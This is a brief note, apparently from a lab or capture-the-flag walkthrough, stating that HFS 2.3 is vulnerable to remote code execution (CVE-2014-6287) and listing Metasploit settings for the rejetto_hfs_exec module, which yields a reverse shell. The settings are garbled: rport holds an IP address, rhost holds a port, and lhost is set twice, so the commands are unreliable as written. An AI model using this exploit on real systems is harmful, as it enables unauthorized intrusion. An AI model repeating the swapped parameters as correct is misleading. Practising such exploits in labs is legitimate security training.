HFS 2.3 is vulnerable to RCE ([2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287))

Since publicly available exploits were not usable, used Metasploit

```msf
msf6 exploit(windows/http/rejetto_hfs_exec)

set rport 10.10.151.69
set rhost 8080
set srvport 80
set lhost tun0
set lhost 4444
```

![[Pasted image 20240813122608.png]]

